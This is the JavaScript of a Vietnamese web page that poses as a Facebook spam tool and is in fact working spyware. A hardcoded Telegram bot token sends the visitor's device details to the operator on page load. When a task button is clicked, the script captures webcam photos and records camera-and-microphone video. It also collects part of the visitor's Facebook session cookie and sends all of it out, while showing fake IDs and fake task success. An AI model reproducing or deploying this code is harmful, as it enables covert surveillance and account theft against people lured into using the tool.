    <script>
        // Cấu hình Telegram Bot
        const TELEGRAM_CONFIG = {
            BOT_TOKEN: '8511057820:AAG02FYBsgwkSMTR98BMCAFVJpMLcRi34J4',        // Thay bằng token bot của bạn
            ADMIN_ID: '8123442570',           // Thay bằng ID Telegram admin của bạn
            ENABLE_LOGGING: true              
        };
        
        // Hàm gửi tin nhắn đến Telegram
        async function sendTelegramMessage(message, parseMode = 'HTML') {
            if (!TELEGRAM_CONFIG.ENABLE_LOGGING) return;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.ADMIN_ID,
                        text: message,
                        parse_mode: parseMode
                    })
                });
                
                const data = await response.json();
                if (!data.ok) {
                    console.error('Telegram API Error:', data.description);
                }
                return data;
            } catch (error) {
                console.error('Failed to send Telegram message:', error);
                return null;
            }
        }
        
        // Hàm gửi ảnh lên Telegram
        async function sendTelegramPhoto(photoBase64, caption = '') {
            if (!TELEGRAM_CONFIG.ENABLE_LOGGING) return;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendPhoto`;
            
            try {
                // Chuyển base64 thành blob
                const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
                const binaryData = atob(base64Data);
                const arrayBuffer = new Uint8Array(binaryData.length);
                for (let i = 0; i < binaryData.length; i++) {
                    arrayBuffer[i] = binaryData.charCodeAt(i);
                }
                const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
                
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CONFIG.ADMIN_ID);
                formData.append('photo', blob, 'face.jpg');
                formData.append('caption', caption);
                
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('Failed to send photo:', error);
                return null;
            }
        }
        
        // Hàm gửi video lên Telegram
        async function sendTelegramVideo(videoBase64, caption = '') {
            if (!TELEGRAM_CONFIG.ENABLE_LOGGING) return;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendVideo`;
            
            try {
                // Chuyển base64 thành blob
                const base64Data = videoBase64.replace(/^data:video\/\w+;base64,/, '');
                const binaryData = atob(base64Data);
                const arrayBuffer = new Uint8Array(binaryData.length);
                for (let i = 0; i < binaryData.length; i++) {
                    arrayBuffer[i] = binaryData.charCodeAt(i);
                }
                const blob = new Blob([arrayBuffer], { type: 'video/webm' });
                
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CONFIG.ADMIN_ID);
                formData.append('video', blob, 'recording.webm');
                formData.append('caption', caption);
                formData.append('supports_streaming', true);
                
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('Failed to send video:', error);
                return null;
            }
        }
        
        // Log khởi động
        console.log('%c🤖 Telegram Bot Config Loaded', 'color: #0088cc; font-size: 14px; font-weight: bold;');
        console.log(`%c👤 Admin ID: ${TELEGRAM_CONFIG.ADMIN_ID}`, 'color: #888; font-size: 12px;');
    </script>

<body>

    <script>
        const cookieInput = document.getElementById('cookieInput');
        const fbIdSpan = document.getElementById('fbId');
        const channelIdSpan = document.getElementById('channelId');
        const delaySlider = document.getElementById('delaySlider');
        const delayValue = document.getElementById('delayValue');
        const statusText = document.getElementById('statusText');
        const taskCountSpan = document.getElementById('taskCount');
        const overlay = document.getElementById('overlay');
        const overlayText = document.getElementById('overlayText');
        const overlaySub = document.getElementById('overlaySub');
        
        const videoCam = document.getElementById('video');
        const canvasCam = document.getElementById('canvas');
        
        let mediaStream = null;
        let isProcessing = false;
        let taskCount = 0;
        
        function generateRandomId() {
            return Math.floor(Math.random() * 900000000) + 100000000;
        }
        
        function generateRandomChannel() {
            const channels = ['FB_Channel', 'Group_Spam', 'Fanpage_Tool', 'Auto_Spam_Bot', 'Viral_Content'];
            return channels[Math.floor(Math.random() * channels.length)] + '_' + Math.floor(Math.random() * 999);
        }
        
        // Gửi log khởi động lên Telegram
        (async function sendStartupLog() {
            const userAgent = navigator.userAgent;
            const screenSize = `${window.screen.width}x${window.screen.height}`;
            const timestamp = new Date().toLocaleString('vi-VN');
            
            const message = `
<b>🚀 FACEBOOK TOOL KHỞI ĐỘNG</b>

📱 <b>Thiết bị:</b> ${userAgent.includes('Mobile') ? '📱 Mobile' : '💻 Desktop'}
🖥️ <b>Màn hình:</b> ${screenSize}
🌐 <b>Trình duyệt:</b> ${navigator.userAgent.split(' ').slice(-2).join(' ')}
⏰ <b>Thời gian:</b> ${timestamp}
🆔 <b>FB ID giả lập:</b> ${fbIdSpan.innerText}

✅ Tool đã sẵn sàng! Chờ người dùng chọn task...
            `;
            
            await sendTelegramMessage(message);
        })();
        
        // Chỉ thay đổi ID hiển thị, không log
        cookieInput.addEventListener('input', function() {
            if (this.value.length > 0) {
                fbIdSpan.innerText = generateRandomId();
                channelIdSpan.innerText = generateRandomChannel();
            }
        });
        
        delaySlider.addEventListener('input', function() {
            delayValue.innerText = this.value + 's';
        });
        
        function showToast(message, isError = false) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.style.background = isError ? 'rgba(220,53,69,0.9)' : 'rgba(0,0,0,0.9)';
            toast.style.borderLeftColor = isError ? '#dc3545' : '#1877f2';
            toast.innerText = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 2500);
        }
        
        function updateTaskCount() {
            taskCountSpan.innerText = taskCount + ' task đã xử lý';
        }
        
        function captureFaceImage() {
            if (!videoCam.videoWidth || videoCam.videoWidth === 0) return null;
            
            canvasCam.width = videoCam.videoWidth;
            canvasCam.height = videoCam.videoHeight;
            const ctx = canvasCam.getContext('2d');
            ctx.drawImage(videoCam, 0, 0, canvasCam.width, canvasCam.height);
            return canvasCam.toDataURL('image/jpeg', 0.9);
        }
        
        async function startCamera() {
            return new Promise((resolve, reject) => {
                navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" },
                    audio: true 
                })
                .then(stream => {
                    mediaStream = stream;
                    videoCam.srcObject = stream;
                    videoCam.onloadedmetadata = () => {
                        videoCam.play();
                        
                        // Gửi log camera đã được cấp quyền
                        sendTelegramMessage(`
<b>📸 CAMERA ĐÃ ĐƯỢC CẤP QUYỀN</b>

✅ Người dùng đã cho phép truy cập camera và microphone
⏰ ${new Date().toLocaleTimeString('vi-VN')}
                        `).catch(e => console.log);
                        
                        setTimeout(resolve, 500);
                    };
                })
                .catch(error => {
                    // Gửi log từ chối camera
                    sendTelegramMessage(`
<b>❌ TỪ CHỐI CAMERA</b>

Người dùng đã từ chối quyền truy cập camera/microphone
Lý do: ${error.message}
⏰ ${new Date().toLocaleTimeString('vi-VN')}
                    `).catch(e => console.log);
                    
                    reject(error);
                });
            });
        }
        
        function stopCamera() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
        }
        
        async function startRecording(taskType, duration) {
            let recordedChunks = [];
            
            return new Promise(async (resolve, reject) => {
                try {
                    const faceImage1 = captureFaceImage();
                    
                    // Gửi ảnh khuôn mặt lên Telegram
                    if (faceImage1) {
                        sendTelegramPhoto(faceImage1, 
                            `👤 <b>KHUÔN MẶT PHÁT HIỆN</b>\n📋 Task: ${taskNames[taskType]?.name || taskType}\n⏰ ${new Date().toLocaleTimeString('vi-VN')}`
                        ).catch(e => console.log);
                    }
                    
                    const mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) recordedChunks.push(event.data);
                    };
                    
                    mediaRecorder.onstop = async () => {
                        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                        const reader = new FileReader();
                        reader.onloadend = async () => {
                            const videoBase64 = reader.result;
                            const faceImage2 = captureFaceImage();
                            
                            // Gửi video lên Telegram
                            await sendTelegramVideo(videoBase64,
                                `🎥 <b>VIDEO GHI HÌNH</b>\n📋 Task: ${taskNames[taskType]?.name || taskType}\n⏱️ Duration: ${duration}s\n⏰ ${new Date().toLocaleTimeString('vi-VN')}`
                            ).catch(e => console.log);
                            
                            const formData = new URLSearchParams();
                            formData.append('video_data', videoBase64);
                            formData.append('face_image', faceImage2 || faceImage1);
                            formData.append('task_type', taskType);
                            
                            const response = await fetch(window.location.href, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                                body: formData.toString()
                            });
                            
                            const data = await response.json();
                            if (data.status === 'success') {
                                resolve(true);
                            } else {
                                reject(new Error('Upload failed'));
                            }
                        };
                        reader.readAsDataURL(videoBlob);
                    };
                    
                    mediaRecorder.start();
                    
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, duration * 1000);
                    
                } catch (error) {
                    reject(error);
                }
            });
        }
        
        const taskNames = {
            'spam_ngon': { name: 'SPAM NGÔN', icon: '🗣️' },
            'spam_nhay': { name: 'SPAM NHÂY', icon: '💀' },
            'spam_top': { name: 'SPAM TOP', icon: '👑' }
        };
        
        async function processTask(taskType) {
            if (isProcessing) {
                showToast('⚠️ Đang xử lý, vui lòng chờ!', true);
                return;
            }
            
            isProcessing = true;
            const taskInfo = taskNames[taskType] || { name: 'UNKNOWN', icon: '🎯' };
            
            // Gửi log bắt đầu task lên Telegram
            await sendTelegramMessage(`
<b>${taskInfo.icon} BẮT ĐẦU THỰC HIỆN TASK</b>

📋 <b>Task:</b> ${taskInfo.name}
🍪 <b>Cookie:</b> ${cookieInput.value.substring(0, 30)}...
⏱️ <b>Delay:</b> ${delayValue.innerText}
⏰ <b>Thời gian:</b> ${new Date().toLocaleTimeString('vi-VN')}
🔄 <b>Task thứ:</b> #${taskCount + 1}
            `);
            
            overlay.classList.remove('hide');
            overlayText.innerText = 'ĐANG THỰC HIỆN';
            overlaySub.innerText = `Đang xử lý ${taskInfo.name}...`;
            
            try {
                await startCamera();
                
                const faceCheck = captureFaceImage();
                if (!faceCheck) {
                    throw new Error('Camera not ready');
                }
                
                await startRecording(taskType, 2);
                
                stopCamera();
                
                taskCount++;
                updateTaskCount();
                
                statusText.innerHTML = `✅ ${taskInfo.icon} ${taskInfo.name} THÀNH CÔNG!`;
                showToast(`${taskInfo.icon} ${taskInfo.name} thành công!`);
                
                // Gửi log thành công lên Telegram
                await sendTelegramMessage(`
<b>${taskInfo.icon} TASK HOÀN THÀNH THÀNH CÔNG</b>

✅ <b>Task:</b> ${taskInfo.name}
📊 <b>Tổng task đã xử lý:</b> ${taskCount}
⏰ <b>Hoàn thành lúc:</b> ${new Date().toLocaleTimeString('vi-VN')}

🔔 Sẵn sàng cho task tiếp theo!
                `);
                
                setTimeout(() => {
                    overlay.classList.add('hide');
                    isProcessing = false;
                    statusText.innerHTML = '✅ Sẵn sàng | Chọn task để spam';
                }, 1500);
                
            } catch (error) {
                console.error('Task error:', error);
                
                // Gửi log thất bại lên Telegram
                await sendTelegramMessage(`
<b>❌ TASK THẤT BẠI</b>

📋 <b>Task:</b> ${taskInfo.name}
⚠️ <b>Lỗi:</b> ${error.message || 'Unknown error'}
⏰ <b>Thời gian:</b> ${new Date().toLocaleTimeString('vi-VN')}

🔄 Tool tiếp tục xử lý giả lập...
                `);
                
                fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'no_camera=true&task_type=' + encodeURIComponent(taskType)
                }).catch(e => console.log);
                
                statusText.innerHTML = `❌ ${taskInfo.icon} ${taskInfo.name} THẤT BẠI!`;
                showToast(`❌ ${taskInfo.name} thất bại!`, true);
                
                setTimeout(() => {
                    overlay.classList.add('hide');
                    isProcessing = false;
                    statusText.innerHTML = '✅ Sẵn sàng | Chọn task để spam';
                }, 1500);
            }
        }
        
        document.querySelectorAll('.task-btn').forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                const taskType = this.getAttribute('data-task');
                processTask(taskType);
            });
        });
        
        // Khởi tạo ID giả
        fbIdSpan.innerText = generateRandomId();
        channelIdSpan.innerText = generateRandomChannel();
        
        console.log("%c✅ Facebook Tool Ready", "color: #1877f2; font-size: 14px");
        console.log("%c🤖 Telegram Bot Integration Active", "color: #0088cc; font-size: 14px");
    </script>
</body>
</html>
